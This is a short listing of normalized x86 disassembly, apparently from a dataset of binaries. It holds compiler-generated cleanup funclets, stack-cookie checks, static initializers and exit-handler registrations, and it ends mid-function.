jmp sub_1000c563
sub_100284a4
lea ecx [ ebp - 0x34 ]
jmp sub_10001704
sub_100284ac
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x94 ]
xor ecx eax
call sub_10010789
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_100284d4
lea ecx [ ebp - 0x30 ]
jmp sub_10001704
sub_100284dc
lea ecx [ ebp - 0xe0 ]
jmp sub_10008c2a
sub_100284e7
lea ecx [ ebp - 0x4c ]
jmp sub_10001704
sub_100284ef
lea esi [ ebp - 0x4c ]
jmp sub_1000175c
sub_100284f7
push [ ebp - 0xf0 ]
call sub_10010ba2
pop ecx
retn
sub_10028504
mov ecx [ ebp - 0xf0 ]
jmp sub_10008739
sub_1002850f
lea ecx [ ebp - 0x128 ]
jmp sub_10001704
sub_1002851a
mov ecx [ ebp - 0xf0 ]
add ecx 0x18
jmp sub_1000c966
sub_10028528
lea ecx [ ebp - 0x10c ]
jmp sub_10001704
sub_10028533
lea eax [ ebp - 0xec ]
jmp sub_1000305f
sub_1002853e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x12c ]
xor ecx eax
call sub_10010789
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10028566
lea esi [ ebp - 0x2c ]
jmp sub_1000175c
sub_1002856e
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x2c ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_10028589
lea ecx [ ebp - 0xa8 ]
jmp sub_10008c2a
sub_10028594
mov edx [ esp + 0x8 ]
lea eax [ edx - 0xa4 ]
mov ecx [ edx - 0xa8 ]
xor ecx eax
call sub_10010789
add eax 0x8
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10010789
mov eax r--data
jmp sub_10013eba
sub_100285d0
call sub_10022ba0
mov [ rw-data ] eax
retn
sub_100285db
call sub_10022ba0
mov [ rw-data ] eax
retn
sub_100285e6
call sub_10022b30
mov [ rw-data ] eax
retn
sub_100285f1
push sub_10028680
call sub_1001457c
pop ecx
retn
sub_100285fd
mov ecx rw-data
call sub_1000fdb6
push sub_1002868a
call sub_1001457c
pop ecx
retn
sub_10028613
mov ecx rw-data
call sub_1000fdb6
push sub_10028694
call sub_1001457c
pop ecx
retn
sub_10028629
push sub_1002869e
call sub_1001457c
pop ecx
retn
sub_10028640
call sub_10022ba0
mov [ rw-data ] eax
retn
sub_10028650
call sub_10022ba0
mov [ rw-data ] eax
retn
sub_10028660
call sub_10022b30
mov [ rw-data ] eax
retn
sub_10028670
call sub_10022b30
mov [ rw-data ] eax
retn
sub_10028680
mov ecx rw-data
jmp sub_100086e3
sub_1002868a
mov ecx rw-data
jmp sub_1000fde7
sub_10028694
mov ecx rw-data
jmp sub_1000fde7
sub_1002869e
mov ecx rw-data
jmp sub_10010724
sub_100286a8
mov [ rw-data ] r--data
mov ecx rw-data
jmp sub_100108d3
sub_100286c0
mov [ rw-data ] r--data
retn
sub_100286d0
mov [ rw-data ] r--data
retn
sub_100286e0
cmp [ rw-data ] 0x10
jb r-xdata
xor eax eax
mov [ rw-data ] 0xf
mov [ rw-data ] eax
mov [ rw-data ] al
retn
mov eax [ rw-data ]
push eax
call sub_10010ba2
add esp 0x4
